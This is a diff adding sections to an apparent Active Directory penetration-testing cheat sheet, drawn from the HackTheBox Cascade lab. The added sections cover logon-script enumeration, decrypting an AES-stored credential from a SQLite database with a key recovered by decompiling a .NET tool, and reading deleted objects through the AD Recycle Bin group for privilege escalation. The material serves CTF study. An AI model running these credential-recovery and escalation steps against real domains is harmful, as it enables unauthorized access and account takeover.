@@ -824,6 +824,25 @@ nxc ldap <target> -u '' -p '' -M user-desc
 * **Scope caveat**: this module only reads the standard `description` field - it will **not** catch a custom attribute like `cascadeLegacyPwd`. For custom/legacy attributes you still need the raw `ldapsearch` dump above
 * List all LDAP modules with `nxc ldap -L`; `-M get-desc-users` is a related one
 
+#### User Logon Script Lookup
+
+* **What** — AD users can have a logon script (`scriptPath`) that runs at every interactive logon. On a box where you control a writable script location, or just want to understand what executes as another user, enumerate it. Also a common CTF breadcrumb ("what script runs when X logs in").
+
+```cmd
+net user <user> /domain
+```
+
+* Read the **`Logon script`** field in the output (works from any domain-joined shell; drop `/domain` for a local account)
+
+* **PowerShell / RSAT equivalent** — pull it directly as an attribute:
+
+```powershell
+Get-ADUser <user> -Properties scriptPath | Select-Object name, scriptPath
+```
+
+* `scriptPath` is the raw attribute behind the `net user` "Logon script" line; the script itself lives under `\\<domain>\NETLOGON\`
+* If that NETLOGON path (or the script it names) is **writable** by an account you control, it's a privesc/lateral primitive — your code runs in the context of whoever logs in next
+
 ---
 
 ### Credential Access
@@ -1041,6 +1060,53 @@ Add-ADGroupMember -Identity "Domain Admins" -Members <your_user>
 * **WriteDACL** — grant yourself DCSync rights (PowerView in memory), then run [DCSync](#dcsync) / `secretsdump.py`
 * Requires RSAT or execution on a DC for `Set-AD*` cmdlets
 
+#### Looted App / DB Credentials (SQLite + .NET decompile + AES)
+
+A custom app found on a share (installer, "audit" tool, service config) often ships a database and the binary that reads it. The DB holds an encrypted credential; the binary holds the key. Classic on HTB **Cascade** (`Audit$` share) — full chain in [writeups/hackthebox/cascade.md](writeups/hackthebox/cascade.md).
+
+* **Read a SQLite DB** — dump tables and look for credential columns:
+
+```bash
+sqlite3 Audit.db
+sqlite> .tables
+sqlite> SELECT * FROM Ldap;
+```
+
+* A value that is Base64 but **decodes to exactly 16 (or a multiple of 16) binary bytes** is an AES block, not a password — the key/IV are hardcoded in the tool next to it
+
+* **Decompile the .NET binary** to recover the hardcoded key + IV:
+
+```bash
+ilspycmd CascCrypto.dll > CascCrypto.cs     # look for the Key, IV, cipher mode, padding
+ilspycmd CascAudit.exe  > CascAudit.cs       # look for where DecryptString is called (the key arg)
+```
+
+* `ilspycmd`: ILSpy's CLI decompiler (`dotnet tool install -g ilspycmd`). GUI alternatives: **ILSpy**, **dnSpy**, **dotPeek**
+* **Version pin** — latest `ilspycmd` needs .NET 10; on .NET 6 install an older build: `dotnet tool install -g ilspycmd --version 8.0.0.7345`
+* **Skip decompiling entirely** when you only need the constants — dump hardcoded UTF-16 strings (keys/IVs are stored as UTF-16LE in .NET assemblies):
+
+```bash
+strings -el CascCrypto.dll
+strings -el CascAudit.exe
+```
+
+* **Decrypt the credential** with the recovered key/IV (AES-CBC here):
+
+```python
+import base64
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+
+key = b"c4scadek3y654321"          # from the .exe (the DecryptString key arg)
+iv  = b"1tdyjCbY1Ix49842"          # from the .dll (constant DefaultIV)
+enc = base64.b64decode("BQO5l5Kj9MdErXx6Q6AGOw==")   # the DB column value
+print(unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(enc), 16).decode())
+```
+
+* `AES.MODE_CBC`: match whatever the decompiled code used (`CipherMode.CBC`); `ECB` takes no IV
+* `.NET`'s `Encoding.UTF8.GetBytes(key)` means the key/IV are the **literal ASCII bytes** of the string — pass them as-is, don't hex-decode
+* **PKCS7 padding**: raw output ends in pad bytes (`...\x03\x03\x03`) — `unpad(x, 16)` strips them (or `rstrip` the trailing byte). `pip install pycryptodome` if `Crypto` is missing
+
 #### Typical Chain: AS-REP → DCSync
 
 ```text
@@ -1140,6 +1206,24 @@ smbclient.py -k -no-pass //<fileserver_fqdn>/share
 | Scope | Entire domain | One service (SPN) |
 | Talks to DC | Yes (on validation) | No |
 | Noise | High | Lower |
+
+#### AD Recycle Bin — Deleted Object Recovery
+
+Members of the **`AD Recycle Bin`** group (or anyone with read on the Deleted Objects container) can read **deleted** AD objects, which still retain their attributes — including custom ones like `cascadeLegacyPwd` — until they're purged. Landing on such an account is a privesc primitive: a deleted admin/temp account often leaks a reusable password.
+
+```powershell
+# Confirm the group first
+whoami /groups        # look for <DOMAIN>\AD Recycle Bin
+
+# Enumerate deleted objects with all attributes
+Get-ADObject -Filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -IncludeDeletedObjects -Properties * |
+  Select-Object name, cascadeLegacyPwd
+```
+
+* `-IncludeDeletedObjects`: required — without it the deleted objects are invisible
+* `-Properties *`: pull every attribute; the interesting value is usually a non-standard/legacy field (as in [LDAP Enumeration](#ldap-enumeration)) or a `description`
+* Decode whatever you find (often Base64 — `echo '<val>' | base64 -d`), then reuse it: a deleted `TempAdmin` whose password matches the live Administrator is the HTB **Cascade** root step — full chain in [writeups/hackthebox/cascade.md](writeups/hackthebox/cascade.md)
+* Related low-level tools: `Get-ADObject` is from RSAT's AD module (available to `arksvc` on Cascade); the raw LDAP control is `1.2.840.113556.1.4.417` (show deleted) if you need to query over `ldapsearch` instead
 
 ---
 
